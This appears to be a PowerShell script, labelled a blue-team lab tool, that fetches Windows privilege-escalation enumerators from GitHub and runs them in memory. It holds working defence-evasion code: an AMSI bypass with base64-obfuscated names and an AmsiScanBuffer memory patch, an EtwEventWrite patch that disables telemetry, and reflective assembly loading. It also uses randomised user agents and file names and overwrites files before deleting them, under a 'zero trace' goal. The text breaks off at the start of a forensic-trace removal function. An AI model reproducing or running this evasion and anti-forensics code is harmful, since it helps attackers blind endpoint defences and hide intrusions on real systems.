<#
.SYNOPSIS
    Windows Automated Security Reconnaissance Script - Blue Team Lab Tool

.DESCRIPTION
    Automatically enumerates vulnerabilities and misconfigurations on Windows machines
    using common privilege escalation and security auditing tools. Designed for blue team
    use in lab environments with maximally vulnerable Windows machines.

    Leaves zero trace on the machine after execution (no tools, minimal forensic artifacts).

.NOTES
    AUTHORIZED USE ONLY - For blue team lab environments with proper authorization.
    Must be run as Administrator.
    Requires PowerShell 5.1+
#>

#Requires -Version 5.1

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Continue'

# ============================================================================
# SECTION A: CONFIGURATION BLOCK (Edit this section to customize)
# ============================================================================

# Tool source: "url" downloads from GitHub, "local" copies from SMB/file path
$ToolSource = "url"

# Base output directory for recon results
$OutputBaseDir = "$env:USERPROFILE\Desktop\ReconResults"

# Timeout per tool execution (seconds)
$TimeoutSeconds = 600

# Tool configuration array
$ToolConfig = @(
    @{
        Name      = "WinPEAS"
        Enabled   = $true
        Type      = "exe"
        Url       = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
        LocalPath = "\\fileserver\tools\winPEASany_ofs.exe"
        FileName  = "winPEASany_ofs.exe"
        Args      = @("quiet", "searchfast", "notcolor")
    },
    @{
        Name      = "Seatbelt"
        Enabled   = $true
        Type      = "exe"
        Url       = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe"
        LocalPath = "\\fileserver\tools\Seatbelt.exe"
        FileName  = "Seatbelt.exe"
        Args      = @("-group=all", "-full")
    },
    @{
        Name      = "SharpUp"
        Enabled   = $true
        Type      = "exe"
        Url       = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe"
        LocalPath = "\\fileserver\tools\SharpUp.exe"
        FileName  = "SharpUp.exe"
        Args      = @("audit")
    },
    @{
        Name      = "JAWS"
        Enabled   = $true
        Type      = "ps1"
        Url       = "https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1"
        LocalPath = "\\fileserver\tools\jaws-enum.ps1"
        FileName  = "jaws-enum.ps1"
        Args      = @()
    },
    @{
        Name      = "PowerUp"
        Enabled   = $true
        Type      = "ps1"
        Url       = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"
        LocalPath = "\\fileserver\tools\PowerUp.ps1"
        FileName  = "PowerUp.ps1"
        Args      = @()
    },
    @{
        Name      = "Powerless"
        Enabled   = $true
        Type      = "bat"
        Url       = "https://raw.githubusercontent.com/gladiatx0r/Powerless/master/Powerless.bat"
        LocalPath = "\\fileserver\tools\Powerless.bat"
        FileName  = "Powerless.bat"
        Args      = @()
    },
    @{
        Name      = "PrivescCheck"
        Enabled   = $true
        Type      = "ps1"
        Url       = "https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1"
        LocalPath = "\\fileserver\tools\PrivescCheck.ps1"
        FileName  = "PrivescCheck.ps1"
        Args      = @()
    }
)

# ============================================================================
# SECTION B: GLOBAL STATE
# ============================================================================

$Script:StartTime = $null
$Script:OutputDir = $null
$Script:LogFile = $null
$Script:ToolResults = @{}
$Script:TempFiles = [System.Collections.ArrayList]::new()
$Script:DashboardSupported = $true
$Script:CurrentPhase = "INIT"
$Script:EnabledTools = @()
$Script:DashboardTop = 0

# ============================================================================
# SECTION C: ASCII ART BANNER
# ============================================================================

function Show-Banner {
    $banner = @"

 __        ___         ____
 \ \      / (_)_ __   |  _ \ ___  ___ ___  _ __
  \ \ /\ / /| | '_ \  | |_) / _ \/ __/ _ \| '_ \
   \ V  V / | | | | | |  _ <  __/ (_| (_) | | | |
    \_/\_/  |_|_| |_| |_| \_\___|\___\___/|_| |_|

   Windows Automated Security Reconnaissance
   Blue Team Lab Edition
"@

    Write-Host ""
    Write-Host $banner -ForegroundColor Cyan
    Write-Host ""
    Write-Host ("  Host: {0}  |  User: {1}  |  OS: {2}" -f $env:COMPUTERNAME, $env:USERNAME, (Get-CimInstance Win32_OperatingSystem).Caption) -ForegroundColor DarkGray
    Write-Host ("  Date: {0}  |  PS: {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $PSVersionTable.PSVersion) -ForegroundColor DarkGray
    Write-Host ""
}

# ============================================================================
# SECTION D: LOGGING
# ============================================================================

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("INFO","WARN","ERROR","DEBUG")]
        [string]$Level = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    if ($Script:LogFile -and (Test-Path (Split-Path $Script:LogFile -Parent))) {
        Add-Content -Path $Script:LogFile -Value $logEntry -ErrorAction SilentlyContinue
    }
}

# ============================================================================
# SECTION E: PRE-FLIGHT CHECKS
# ============================================================================

function Invoke-PreFlightChecks {
    Write-Host "  PRE-FLIGHT CHECKS" -ForegroundColor White
    Write-Host "  ==================" -ForegroundColor DarkGray
    $criticalFailed = $false

    # Critical: Administrator privileges
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) {
        Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "Administrator privileges"
        Write-Log "Pre-flight: Administrator privileges - PASS"
    } else {
        Write-Host "  [FAIL] " -ForegroundColor Red -NoNewline; Write-Host "Administrator privileges required"
        Write-Host "         Run: powershell.exe -ExecutionPolicy Bypass -File .\Invoke-WindowsRecon.ps1" -ForegroundColor Yellow
        Write-Host "         Must be launched from an elevated (Administrator) prompt." -ForegroundColor Yellow
        Write-Log "Pre-flight: Administrator privileges - FAIL" -Level "ERROR"
        $criticalFailed = $true
    }

    # Critical: PowerShell version >= 5.1
    $psVer = $PSVersionTable.PSVersion
    if ($psVer.Major -ge 5 -and $psVer.Minor -ge 1 -or $psVer.Major -ge 6) {
        Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "PowerShell $($psVer.Major).$($psVer.Minor)"
        Write-Log "Pre-flight: PowerShell version $psVer - PASS"
    } else {
        Write-Host "  [FAIL] " -ForegroundColor Red -NoNewline; Write-Host "PowerShell 5.1+ required (current: $psVer)"
        Write-Host "         Install WMF 5.1: https://aka.ms/wmf5download" -ForegroundColor Yellow
        Write-Log "Pre-flight: PowerShell version $psVer - FAIL" -Level "ERROR"
        $criticalFailed = $true
    }

    # Critical: Disk space > 500MB
    $outputDrive = if ($OutputBaseDir -match '^([A-Za-z]):') { $Matches[1] + ":" } else { $env:SystemDrive }
    try {
        $disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='$outputDrive'" -ErrorAction Stop
        $freeGB = [math]::Round($disk.FreeSpace / 1GB, 1)
        if ($disk.FreeSpace -gt 500MB) {
            Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "Disk space ($freeGB GB free)"
            Write-Log "Pre-flight: Disk space $freeGB GB - PASS"
        } else {
            Write-Host "  [FAIL] " -ForegroundColor Red -NoNewline; Write-Host "Insufficient disk space ($freeGB GB free, need >500 MB)"
            Write-Log "Pre-flight: Disk space $freeGB GB - FAIL" -Level "ERROR"
            $criticalFailed = $true
        }
    } catch {
        Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "Could not check disk space"
        Write-Log "Pre-flight: Disk space check failed - $($_.Exception.Message)" -Level "WARN"
    }

    # Critical: Output directory writable
    try {
        $testDir = $OutputBaseDir
        if (-not (Test-Path $testDir)) {
            New-Item -ItemType Directory -Path $testDir -Force | Out-Null
        }
        $testFile = Join-Path $testDir ".writetest_$(Get-Random)"
        Set-Content -Path $testFile -Value "test" -ErrorAction Stop
        Remove-Item $testFile -Force -ErrorAction SilentlyContinue
        Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "Output directory writable"
        Write-Log "Pre-flight: Output directory writable - PASS"
    } catch {
        Write-Host "  [FAIL] " -ForegroundColor Red -NoNewline; Write-Host "Output directory not writable: $OutputBaseDir"
        Write-Host "         Check permissions or change `$OutputBaseDir in script config." -ForegroundColor Yellow
        Write-Log "Pre-flight: Output directory writable - FAIL - $($_.Exception.Message)" -Level "ERROR"
        $criticalFailed = $true
    }

    # Non-critical: Internet connectivity (only if url source)
    if ($ToolSource -eq "url") {
        try {
            $webTest = [System.Net.WebRequest]::Create("https://github.com")
            $webTest.Timeout = 5000
            $webTest.Method = "HEAD"
            $response = $webTest.GetResponse()
            $response.Close()
            Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "Internet connectivity"
            Write-Log "Pre-flight: Internet connectivity - PASS"
        } catch {
            Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "Internet connectivity - GitHub unreachable (downloads may fail)"
            Write-Log "Pre-flight: Internet connectivity - WARN" -Level "WARN"
        }
    }

    # Non-critical: SMB share reachable (only if local source)
    if ($ToolSource -eq "local") {
        $firstTool = $ToolConfig | Where-Object { $_.Enabled } | Select-Object -First 1
        if ($firstTool) {
            $sharePath = Split-Path $firstTool.LocalPath -Parent
            if (Test-Path $sharePath -ErrorAction SilentlyContinue) {
                Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "SMB share reachable ($sharePath)"
                Write-Log "Pre-flight: SMB share reachable - PASS"
            } else {
                Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "SMB share unreachable ($sharePath)"
                Write-Log "Pre-flight: SMB share unreachable - WARN" -Level "WARN"
            }
        }
    }

    # Non-critical: .NET Framework version
    try {
        $dotnetKey = "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"
        if (Test-Path $dotnetKey) {
            $release = (Get-ItemProperty $dotnetKey -Name Release -ErrorAction SilentlyContinue).Release
            if ($release -ge 378389) {
                $netVer = switch ($true) {
                    ($release -ge 528040) { "4.8+" }
                    ($release -ge 461808) { "4.7.2" }
                    ($release -ge 461308) { "4.7.1" }
                    ($release -ge 460798) { "4.7" }
                    ($release -ge 394802) { "4.6.2" }
                    ($release -ge 394254) { "4.6.1" }
                    ($release -ge 393295) { "4.6" }
                    ($release -ge 379893) { "4.5.2" }
                    ($release -ge 378675) { "4.5.1" }
                    default { "4.5" }
                }
                Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host ".NET Framework $netVer"
                Write-Log "Pre-flight: .NET Framework $netVer - PASS"
            } else {
                Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host ".NET 4.5+ not detected - some exe tools may fail"
                Write-Log "Pre-flight: .NET 4.5+ not detected - WARN" -Level "WARN"
            }
        } else {
            Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host ".NET 4.5+ not detected - some exe tools may fail"
            Write-Log "Pre-flight: .NET 4.5+ not detected - WARN" -Level "WARN"
        }
    } catch {
        Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "Could not check .NET version"
        Write-Log "Pre-flight: .NET version check failed" -Level "WARN"
    }

    # Non-critical: Windows Defender status
    try {
        $defenderStatus = Get-MpComputerStatus -ErrorAction Stop
        if ($defenderStatus.RealTimeProtectionEnabled) {
            Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "Windows Defender real-time protection is ENABLED"
            Write-Log "Pre-flight: Defender RTP enabled - WARN" -Level "WARN"
        } else {
            Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "Windows Defender real-time protection is disabled"
            Write-Log "Pre-flight: Defender RTP disabled - PASS"
        }
    } catch {
        Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "Windows Defender not present or inaccessible"
        Write-Log "Pre-flight: Defender not available" -Level "INFO"
    }

    # Non-critical: Execution policy
    $execPolicy = Get-ExecutionPolicy -Scope Process
    if ($execPolicy -eq "Bypass" -or $execPolicy -eq "Unrestricted") {
        Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "Execution policy: $execPolicy"
        Write-Log "Pre-flight: Execution policy $execPolicy - PASS"
    } else {
        Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "Execution policy: $execPolicy (Bypass recommended)"
        Write-Log "Pre-flight: Execution policy $execPolicy - WARN" -Level "WARN"
    }

    Write-Host ""

    if ($criticalFailed) {
        Write-Host "  CRITICAL PRE-FLIGHT CHECKS FAILED - Cannot continue." -ForegroundColor Red
        Write-Host "  Fix the issues above and re-run the script." -ForegroundColor Red
        Write-Host ""
        Write-Log "Pre-flight: Critical checks failed - aborting" -Level "ERROR"
        throw "Critical pre-flight checks failed"
    }

    Write-Host "  All critical checks passed. Proceeding..." -ForegroundColor Green
    Write-Host ""
    Write-Log "Pre-flight: All critical checks passed"
}

# ============================================================================
# SECTION F: EDR EVASION FUNCTIONS
# ============================================================================

function Invoke-AmsiBypass {
    Write-Log "Attempting AMSI bypass"
    try {
        # Technique 1: Patch AmsiScanBuffer
        $amsiDll = [Ref].Assembly.GetType(
            [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))
        )
        if ($amsiDll) {
            $field = $amsiDll.GetField(
                [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ=")),
                'NonPublic,Static'
            )
            if ($field) {
                $field.SetValue($null, $true)
                Write-Log "AMSI bypass: Technique 1 (amsiInitFailed) succeeded"
                return $true
            }
        }
    } catch {
        Write-Log "AMSI bypass: Technique 1 failed - $($_.Exception.Message)" -Level "WARN"
    }

    try {
        # Technique 2: Direct memory patch via Win32 API
        $win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32Amsi {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
        Add-Type -TypeDefinition $win32 -Language CSharp -ErrorAction SilentlyContinue

        $amsiAddr = [Win32Amsi]::GetProcAddress([Win32Amsi]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
        if ($amsiAddr -ne [IntPtr]::Zero) {
            $oldProtect = 0
            [Win32Amsi]::VirtualProtect($amsiAddr, [UIntPtr]::new(5), 0x40, [ref]$oldProtect) | Out-Null

            # x86/x64 ret patch
            $patch = if ([IntPtr]::Size -eq 8) {
                [byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
            } else {
                [byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00)
            }
            [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiAddr, $patch.Length)
            [Win32Amsi]::VirtualProtect($amsiAddr, [UIntPtr]::new(5), $oldProtect, [ref]$oldProtect) | Out-Null

            Write-Log "AMSI bypass: Technique 2 (memory patch) succeeded"
            return $true
        }
    } catch {
        Write-Log "AMSI bypass: Technique 2 failed - $($_.Exception.Message)" -Level "WARN"
    }

    Write-Log "AMSI bypass: All techniques failed" -Level "WARN"
    return $false
}

function Invoke-EtwPatch {
    Write-Log "Attempting ETW patch"
    try {
        $etwType = @"
using System;
using System.Runtime.InteropServices;
public class Win32Etw {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
        Add-Type -TypeDefinition $etwType -Language CSharp -ErrorAction SilentlyContinue

        $ntdll = [Win32Etw]::LoadLibrary("ntdll.dll")
        $etwAddr = [Win32Etw]::GetProcAddress($ntdll, "EtwEventWrite")

        if ($etwAddr -ne [IntPtr]::Zero) {
            $oldProtect = 0
            [Win32Etw]::VirtualProtect($etwAddr, [UIntPtr]::new(1), 0x40, [ref]$oldProtect) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr, 0xC3)  # ret
            [Win32Etw]::VirtualProtect($etwAddr, [UIntPtr]::new(1), $oldProtect, [ref]$oldProtect) | Out-Null

            Write-Log "ETW patch: Succeeded"
            return $true
        }
    } catch {
        Write-Log "ETW patch: Failed - $($_.Exception.Message)" -Level "WARN"
    }
    return $false
}

# ============================================================================
# SECTION G: DASHBOARD UI
# ============================================================================

function Get-RandomName {
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    $name = -join (1..12 | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
    return $name
}

function Get-UserAgentString {
    $agents = @(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
    )
    return $agents[(Get-Random -Maximum $agents.Count)]
}

function Show-Dashboard {
    $elapsed = if ($Script:StartTime) { (Get-Date) - $Script:StartTime } else { [TimeSpan]::Zero }
    $elapsedStr = "{0:D2}:{1:D2}" -f [int]$elapsed.TotalMinutes, $elapsed.Seconds
    $enabledCount = $Script:EnabledTools.Count
    $completedCount = ($Script:ToolResults.Values | Where-Object { $_.Status -in @("OK","FAIL","SKIP","TIMEOUT") }).Count

    # Progress bar
    $barWidth = 20
    $filledCount = if ($enabledCount -gt 0) { [math]::Floor(($completedCount / $enabledCount) * $barWidth) } else { 0 }
    $emptyCount = $barWidth - $filledCount
    $progressBar = ([string][char]0x2588) * $filledCount + ([string][char]0x2591) * $emptyCount

    $separator = "=" * 56

    if ($Script:DashboardSupported) {
        try {
            [Console]::SetCursorPosition(0, $Script:DashboardTop)
        } catch {
            $Script:DashboardSupported = $false
        }
    }

    if (-not $Script:DashboardSupported) {
        # Simple fallback output
        Write-Host ""
        Write-Host "  Progress: $completedCount/$enabledCount  |  Phase: $($Script:CurrentPhase)  |  Elapsed: $elapsedStr"
        foreach ($tool in $Script:EnabledTools) {
            $tr = $Script:ToolResults[$tool.Name]
            $icon = switch ($tr.Status) {
                "OK"      { "[OK]   " }
                "FAIL"    { "[FAIL] " }
                "RUNNING" { "[RUN]  " }
                "TIMEOUT" { "[TIME] " }
                "SKIP"    { "[SKIP] " }
                default   { "[PEND] " }
            }
            $extra = ""
            if ($tr.Duration -gt 0) { $extra += " ($([math]::Round($tr.Duration, 1))s)" }
            if ($tr.OutputSize -gt 0) {
                $sizeStr = if ($tr.OutputSize -ge 1MB) { "$([math]::Round($tr.OutputSize/1MB, 1)) MB" } else { "$([math]::Round($tr.OutputSize/1KB, 0)) KB" }
                $extra += " -> $sizeStr"
            }
            if ($tr.Error) { $extra += " - $($tr.Error)" }
            Write-Host "  $icon $($tool.Name)$extra"
        }
        return
    }

    # Full dashboard with cursor positioning
    Write-Host $separator -ForegroundColor DarkCyan
    Write-Host ("       WINDOWS SECURITY RECON - BLUE TEAM LAB") -ForegroundColor Cyan
    Write-Host ("  Host: {0}  |  User: {1}" -f $env:COMPUTERNAME, $env:USERNAME) -ForegroundColor DarkGray
    Write-Host $separator -ForegroundColor DarkCyan
    Write-Host ""
    Write-Host ("  Overall Progress  [{0}]  {1}/{2}" -f $progressBar, $completedCount, $enabledCount) -ForegroundColor White
    Write-Host ""

    foreach ($tool in $Script:EnabledTools) {
        $tr = $Script:ToolResults[$tool.Name]
        $statusStr = ""
        $color = "Gray"
        $extra = ""

        switch ($tr.Status) {
            "OK" {
                $statusStr = "  [OK]     "
                $color = "Green"
                if ($tr.Duration -gt 0) { $extra += " ($([math]::Round($tr.Duration, 1))s)" }
                if ($tr.OutputSize -gt 0) {
                    $sizeStr = if ($tr.OutputSize -ge 1MB) { "$([math]::Round($tr.OutputSize/1MB, 1)) MB" } else { "$([math]::Round($tr.OutputSize/1KB, 0)) KB" }
                    $extra += "  -> $sizeStr output"
                }
            }
            "FAIL" {
                $statusStr = "  [FAIL]   "
                $color = "Red"
                if ($tr.Duration -gt 0) { $extra += " ($([math]::Round($tr.Duration, 1))s)" }
                if ($tr.Error) { $extra += "  - $($tr.Error)" }
            }
            "TIMEOUT" {
                $statusStr = "  [TIMEOUT]"
                $color = "Red"
                $extra += " (>${TimeoutSeconds}s)"
            }
            "RUNNING" {
                $spinChars = @('|','/','-','\')
                $spinIdx = [int]((Get-Date).Second % 4)
                $statusStr = "  [RUNNING]"
                $color = "Yellow"
                $runDuration = if ($tr.StartedAt) { [math]::Round(((Get-Date) - $tr.StartedAt).TotalSeconds, 1) } else { 0 }
                $extra += " ($($runDuration)s)  $($spinChars[$spinIdx])"
            }
            "SKIP" {
                $statusStr = "  [SKIP]   "
                $color = "Cyan"
                if ($tr.Error) { $extra += "  - $($tr.Error)" }
            }
            default {
                $statusStr = "  [PENDING]"
                $color = "DarkGray"
            }
        }

        # Pad the tool name and extra info to overwrite previous content
        $line = "$statusStr $($tool.Name.PadRight(16))$extra"
        $line = $line.PadRight(54)
        Write-Host $line -ForegroundColor $color
    }

    Write-Host ""
    Write-Host ("  Phase: {0}  |  Elapsed: {1}" -f $Script:CurrentPhase, $elapsedStr) -ForegroundColor DarkGray
    Write-Host $separator -ForegroundColor DarkCyan
}

function Initialize-Dashboard {
    $Script:DashboardTop = [Console]::CursorTop

    # Check if we're in a real terminal (not piped output)
    try {
        $null = [Console]::CursorLeft
    } catch {
        $Script:DashboardSupported = $false
    }

    # Initialize tool results
    foreach ($tool in $Script:EnabledTools) {
        $Script:ToolResults[$tool.Name] = @{
            Status    = "PENDING"
            Error     = $null
            Duration  = 0
            OutputSize = 0
            StartedAt = $null
            OutputFile = $null
        }
    }
}

# ============================================================================
# SECTION H: CORE FUNCTIONS
# ============================================================================

function Initialize-Environment {
    Write-Log "Initializing environment"
    $Script:StartTime = Get-Date

    # Create timestamped output directory
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $Script:OutputDir = Join-Path $OutputBaseDir "Recon_$timestamp"
    New-Item -ItemType Directory -Path $Script:OutputDir -Force | Out-Null
    $Script:LogFile = Join-Path $Script:OutputDir "recon-log.txt"

    Write-Log "Output directory: $($Script:OutputDir)"

    # Force TLS 1.2 for GitHub downloads
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

    # Get enabled tools
    $Script:EnabledTools = @($ToolConfig | Where-Object { $_.Enabled })
    Write-Log "Enabled tools: $($Script:EnabledTools.Count) / $($ToolConfig.Count)"

    # Apply EDR evasion
    $Script:CurrentPhase = "EVASION"
    Write-Host "  Applying evasion techniques..." -ForegroundColor DarkGray

    $amsiResult = Invoke-AmsiBypass
    if ($amsiResult) {
        Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "AMSI bypass applied"
    } else {
        Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "AMSI bypass failed (tools may be detected)"
    }
    Write-Log "AMSI bypass result: $amsiResult"

    $etwResult = Invoke-EtwPatch
    if ($etwResult) {
        Write-Host "  [PASS] " -ForegroundColor Green -NoNewline; Write-Host "ETW patch applied"
    } else {
        Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline; Write-Host "ETW patch failed (telemetry may be logged)"
    }
    Write-Log "ETW patch result: $etwResult"

    Write-Host ""
}

function Get-Tool {
    param(
        [hashtable]$Tool
    )

    $toolName = $Tool.Name
    $toolType = $Tool.Type
    Write-Log "Downloading tool: $toolName (type: $toolType, source: $ToolSource)"

    $sourceUrl = if ($ToolSource -eq "url") { $Tool.Url } else { $Tool.LocalPath }

    if ($ToolSource -eq "url") {
        # Download from URL with randomized User-Agent
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", (Get-UserAgentString))

        switch ($toolType) {
            "exe" {
                # Download to byte array - never touches disk
                $bytes = $webClient.DownloadData($sourceUrl)
                Write-Log "Downloaded $toolName to memory ($($bytes.Length) bytes)"
                return @{ Bytes = $bytes; Path = $null }
            }
            "ps1" {
                # Download as string - never touches disk
                $scriptContent = $webClient.DownloadString($sourceUrl)
                Write-Log "Downloaded $toolName script to memory ($($scriptContent.Length) chars)"
                return @{ Script = $scriptContent; Path = $null }
            }
            "bat" {
                # Must touch disk - use randomized filename
                $randomName = "$(Get-RandomName).cmd"
                $tempPath = Join-Path $env:TEMP $randomName
                $webClient.DownloadFile($sourceUrl, $tempPath)
                $Script:TempFiles.Add($tempPath) | Out-Null
                Write-Log "Downloaded $toolName to disk: $tempPath (randomized name)"
                return @{ Path = $tempPath; Bytes = $null }
            }
        }
    } else {
        # Copy from local/SMB path
        $localFile = $Tool.LocalPath

        switch ($toolType) {
            "exe" {
                $bytes = [System.IO.File]::ReadAllBytes($localFile)
                Write-Log "Loaded $toolName from local path to memory ($($bytes.Length) bytes)"
                return @{ Bytes = $bytes; Path = $null }
            }
            "ps1" {
                $scriptContent = [System.IO.File]::ReadAllText($localFile)
                Write-Log "Loaded $toolName script from local path ($($scriptContent.Length) chars)"
                return @{ Script = $scriptContent; Path = $null }
            }
            "bat" {
                $randomName = "$(Get-RandomName).cmd"
                $tempPath = Join-Path $env:TEMP $randomName
                Copy-Item -Path $localFile -Destination $tempPath -Force
                $Script:TempFiles.Add($tempPath) | Out-Null
                Write-Log "Copied $toolName to temp: $tempPath (randomized name)"
                return @{ Path = $tempPath; Bytes = $null }
            }
        }
    }
}

function Invoke-ToolRunner {
    param(
        [hashtable]$Tool,
        [hashtable]$ToolData
    )

    $toolName = $Tool.Name
    $toolType = $Tool.Type
    $outputFile = Join-Path $Script:OutputDir "$toolName-output.txt"
    $Script:ToolResults[$toolName].OutputFile = $outputFile

    Write-Log "Executing tool: $toolName (type: $toolType)"

    switch ($toolType) {
        "exe" {
            # In-memory .NET assembly execution
            $bytes = $ToolData.Bytes
            $assembly = [System.Reflection.Assembly]::Load($bytes)
            $entryPoint = $assembly.EntryPoint

            if (-not $entryPoint) {
                throw "No entry point found in $toolName assembly"
            }

            # Redirect stdout to capture output
            $oldOut = [Console]::Out
            $stringWriter = New-Object System.IO.StringWriter
            [Console]::SetOut($stringWriter)

            try {
                # Build parameters for Main()
                $params = $Tool.Args
                if ($entryPoint.GetParameters().Count -gt 0) {
                    $entryPoint.Invoke($null, @(,[string[]]$params))
                } else {
                    $entryPoint.Invoke($null, $null)
                }
            } catch [System.Exception] {
                # Many tools throw on completion - capture output anyway
                Write-Log "$toolName threw exception during execution: $($_.Exception.InnerException.Message)" -Level "WARN"
            } finally {
                [Console]::SetOut($oldOut)
            }

            $output = $stringWriter.ToString()
            $stringWriter.Dispose()

            if ($output.Length -gt 0) {
                Set-Content -Path $outputFile -Value $output -Encoding UTF8
            } else {
                throw "$toolName produced no output"
            }
        }

        "ps1" {
            # In-memory PowerShell script execution
            $scriptContent = $ToolData.Script

            $output = switch ($toolName) {
                "JAWS" {
                    # JAWS outputs directly when dot-sourced
                    $sb = [scriptblock]::Create($scriptContent)
                    & $sb
                }
                "PowerUp" {
                    # PowerUp needs to be loaded, then Invoke-AllChecks called
                    $sb = [scriptblock]::Create($scriptContent + "`nInvoke-AllChecks")
                    & $sb
                }
                "PrivescCheck" {
                    # PrivescCheck needs to be loaded, then Invoke-PrivescCheck called
                    $sb = [scriptblock]::Create($scriptContent + "`nInvoke-PrivescCheck -Extended")
                    & $sb
                }
                default {
                    $sb = [scriptblock]::Create($scriptContent)
                    & $sb
                }
            }

            $outputText = $output | Out-String
            if ($outputText.Length -gt 0) {
                Set-Content -Path $outputFile -Value $outputText -Encoding UTF8
            } else {
                throw "$toolName produced no output"
            }
        }

        "bat" {
            # Must execute from disk
            $batPath = $ToolData.Path
            $output = & cmd.exe /c "`"$batPath`"" 2>&1 | Out-String

            if ($output.Length -gt 0) {
                Set-Content -Path $outputFile -Value $output -Encoding UTF8
            } else {
                throw "$toolName produced no output"
            }
        }
    }
}

# ============================================================================
# SECTION I: CLEANUP FUNCTIONS
# ============================================================================

function Remove-SecureFile {
    param([string]$FilePath)
    if (Test-Path $FilePath) {
        try {
            # Overwrite with random data before deletion
            $fileSize = (Get-Item $FilePath).Length
            if ($fileSize -gt 0) {
                $randomBytes = New-Object byte[] ([math]::Min($fileSize, 10MB))
                (New-Object Random).NextBytes($randomBytes)
                [System.IO.File]::WriteAllBytes($FilePath, $randomBytes)
            }
            Remove-Item -Path $FilePath -Force -ErrorAction Stop
            Write-Log "Securely deleted: $FilePath"
            return $true
        } catch {
            Write-Log "Failed to delete: $FilePath - $($_.Exception.Message)" -Level "WARN"
            return $false
        }
    }
    return $true
}

function Remove-ReconTools {
    Write-Log "Cleaning up downloaded tools"

    foreach ($tempFile in $Script:TempFiles) {
        $result = Remove-SecureFile -FilePath $tempFile
        if (-not $result) {
            Write-Log "Could not remove temp file: $tempFile" -Level "WARN"
        }
    }

    # Clean up any stray temp files from this session
    $tempDir = $env:TEMP
    Get-ChildItem -Path $tempDir -Filter "*.cmd" -ErrorAction SilentlyContinue |
        Where-Object { $_.CreationTime -ge $Script:StartTime } |
        ForEach-Object {
            Remove-SecureFile -FilePath $_.FullName
        }
}

function Remove-ForensicTraces {
